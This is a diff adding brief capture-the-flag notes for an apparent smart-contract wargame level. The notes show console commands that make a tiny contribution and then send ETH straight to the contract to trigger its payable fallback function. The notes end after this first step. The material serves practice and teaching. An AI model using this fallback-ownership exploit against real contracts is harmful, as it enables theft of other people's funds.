@@ -1,0 +1,20 @@
+the owner of the contract have 10000000ETH
+
+contract.contributions("0x234094aac85628444a82dae0396c680974260be7")
+0: 10000000
+
+the limit for a contribution is 0.001ETH
+
+##########   1 ##########
+
+First way use the payable fallback function:
+
+To pass the require you need to send value to the contributions
+
+contract.contribute.sendTransaction({from: player, to: contract.address, gas: 100000, value: 1})
+
+then call the payable function
+
+contract.sendTransaction({from: player, to: contract.address, gas: 100000, value: 1})
+
+
